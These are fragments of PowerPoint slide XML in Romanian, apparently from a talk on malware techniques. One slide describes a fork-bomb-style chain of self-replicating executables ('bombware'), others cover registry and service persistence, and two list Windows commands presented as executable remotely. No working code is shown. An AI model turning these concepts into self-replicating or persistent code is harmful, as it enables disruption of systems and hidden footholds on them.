        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1910028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2057" y="2978621"/>
            <a:ext cx="3048000" cy="2395728"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>bombware</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581193" y="2180496"/>
            <a:ext cx="4740616" cy="3678303"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Execution via fisiune</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Se începe de la un fisier executat, care creaza altele doua, le executa iar acelea la randul lor reiau fiecare ciclu. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Probabilitate de AV-DoS</a:t>
            </a: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59523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18981" y="884937"/>
            <a:ext cx="9755187" cy="2766528"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" u="sng"/>
              <a:t>C.14.2</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Persistenta 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706030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persistenta</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8217" y="2029968"/>
            <a:ext cx="7587134" cy="4474464"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2127688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Chei de registrii</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584" y="2539698"/>
            <a:ext cx="11247120" cy="3181618"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Flowchart: Process 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="889270" y="2384250"/>
            <a:ext cx="2012426" cy="1334310"/>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6" name="Flowchart: Process 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3127248" y="2384250"/>
            <a:ext cx="4364736" cy="1334310"/>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7" name="Flowchart: Process 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="291862" y="3874008"/>
            <a:ext cx="11631914" cy="20027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95622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3670" y="-12700"/>
            <a:ext cx="8584660" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Flowchart: Process 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1803670" y="3236976"/>
            <a:ext cx="1896602" cy="35966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41796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7200" y="1908629"/>
            <a:ext cx="11284857" cy="483325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Aplicații înregistrate ca servicii</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581192" y="2180497"/>
            <a:ext cx="11029615" cy="489552"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://learn.microsoft.com/en-us/windows/win32/services/writing-a-service-program-s-main-function</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3035717" y="2758954"/>
            <a:ext cx="5915596" cy="3703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06850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7383" y="207246"/>
            <a:ext cx="4118452" cy="6387465"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6052455" y="2447925"/>
            <a:ext cx="5348516" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Set de tool-uri de securitate, experimentale si gratuite</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Flowchart: Process 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5188857" y="2090057"/>
            <a:ext cx="6611257" cy="20537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6" name="Flowchart: Process 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="268515" y="108856"/>
            <a:ext cx="4339772" cy="666205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pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Picture 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2E0869A3-EDED-0847-72C5-64CC5747EC4A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7746666" y="5218937"/>
            <a:ext cx="1495637" cy="512394"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2456589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283463" y="898071"/>
            <a:ext cx="11712593" cy="584381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a:xfrm>
            <a:off x="283463" y="169184"/>
            <a:ext cx="10515600" cy="728888"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="it-IT" sz="2800"/>
              <a:t>Câteva comenzi clasice de Windows care pot fi executate la distanță</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="722086" y="1303110"/>
            <a:ext cx="10515600" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1400"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="366658"/>
                </a:solidFill>
              </a:rPr>
              <a:t>dir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t>- Afișează o listă a fișierelor și directoarelor dintr-un director.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="366658"/>
                </a:solidFill>
              </a:rPr>
              <a:t> ipconfig </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t>- Afișează informații despre configurarea IP a mașinii.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="366658"/>
                </a:solidFill>
              </a:rPr>
              <a:t>tasklist</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t> - Afișează toate procesele care rulează pe sistem.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="366658"/>
                </a:solidFill>
              </a:rPr>
              <a:t>netstat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t> - Afișează toate conexiunile de rețea active și porturile deschise.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="366658"/>
                </a:solidFill>
              </a:rPr>
              <a:t>systeminfo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t> - Afișează informații detaliate despre configurarea sistemului.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="366658"/>
                </a:solidFill>
              </a:rPr>
              <a:t>net users </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t>- Afișează toți utilizatorii sistemului.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="366658"/>
                </a:solidFill>
              </a:rPr>
              <a:t>type </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t>- Afișează conținutul unui fișier text.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="366658"/>
                </a:solidFill>
              </a:rPr>
              <a:t>copy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t> / </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="366658"/>
                </a:solidFill>
              </a:rPr>
              <a:t>xcopy </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t>/ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="366658"/>
                </a:solidFill>
              </a:rPr>
              <a:t>robocopy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t> - Copiază fișiere și directoare.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="366658"/>
                </a:solidFill>
              </a:rPr>
              <a:t>del</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t> - Șterge unul sau mai multe fișiere.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="366658"/>
                </a:solidFill>
              </a:rPr>
              <a:t>move</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t> - Muta fișierele de la un director la altul.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="366658"/>
                </a:solidFill>
              </a:rPr>
              <a:t>shutdown</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t> / </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="366658"/>
                </a:solidFill>
              </a:rPr>
              <a:t>restart</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t> - Oprirea sau repornirea mașinii.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="366658"/>
                </a:solidFill>
              </a:rPr>
              <a:t>schtasks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t> - Afișează, creează sau modifică sarcini automate.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="366658"/>
                </a:solidFill>
              </a:rPr>
              <a:t>wmic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t> - Interfață de comandă pentru Instrumentația de Management Windows (Windows Management Instrumentation - WMI).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1400"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400"/>
              <a:t>Aceste comenzi pot fi folosite în diverse scenarii, de la diagnostic și monitorizare, la administrarea sistemului și rezolvarea problemelor.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1788585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372" y="124791"/>
            <a:ext cx="11419114" cy="876695"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="it-IT" sz="3600"/>
              <a:t>Comenzi pe care le puteți găsi la îndemână sau interesante</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="388257" y="729796"/>
            <a:ext cx="5098143" cy="3980089"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1200"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1"/>
              <a:t>Cipher</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200"/>
              <a:t>: Ștergeți în siguranță spațiul neutilizat al unui director. Deși nu șterge fișierele existente, este excelent pentru a vă asigura că fișierele șterse nu pot fi recuperate.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cipher /w:C:\Path\To\Directory</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1200"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1"/>
              <a:t>Robocopy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200"/>
              <a:t>: Înseamnă „Robust File Copy”. Este folosit pentru sarcini mai complexe de replicare a fișierelor. Excelent pentru a face copii de rezervă ale folderelor și fișierelor cu parametri detaliați, cum ar fi oglindirea unui director.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>robocopy C:\source C:\destination /MIR</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1200"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1"/>
              <a:t>Systeminfo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200"/>
              <a:t>: Afișează informații detaliate de configurare despre un computer și sistemul său de operare, inclusiv detalii hardware și software.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>systeminfo</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1200"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1"/>
              <a:t>Netstat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200"/>
              <a:t>: Afișează statisticile rețelei. Util pentru a vedea conexiunile active și porturile pe care ascultă computerul.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>netstat -ano</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1200"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1"/>
              <a:t>Sfc /scannow</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200"/>
              <a:t>: Verificatorul fișierelor de sistem scanează fișierele de sistem Windows corupte sau lipsă și încearcă să le repare. Acest lucru poate fi o salvare pentru remedierea diferitelor probleme ale sistemului.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sfc /scannow</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5711371" y="1058468"/>
            <a:ext cx="6212115" cy="5249642"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="228600" lvl="0" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Shutdown</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: Pe lângă închiderea computerului, acesta poate fi folosit pentru a reporni, a deconecta sau a seta un temporizator pentru aceste acțiuni.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" lvl="0" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>shutdown /r /t 0 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t># Instantly restarts the computer.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" lvl="0" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1200">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" lvl="0" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ipconfig</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: Util pentru depanarea rețelei, afișează toate valorile actuale de configurare a rețelei TCP/IP, inclusiv adresa IP, masca de subrețea și gateway-ul implicit.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" lvl="0" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ipconfig /all</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" lvl="0" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1200">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" lvl="0" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tasklist &amp; Taskkill</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: lista de activități arată toate procesele care rulează. Comanda </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t>taskkill</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t> poate fi apoi folosita pentru a încheia orice proces, permițându-vă efectiv să opriti programele care nu răspund.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" lvl="0" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>tasklist taskkill /F /PID process_number</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" lvl="0" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1200">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" lvl="0" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Assoc and Ftype</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: Comanda </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t>asoc</a:t>
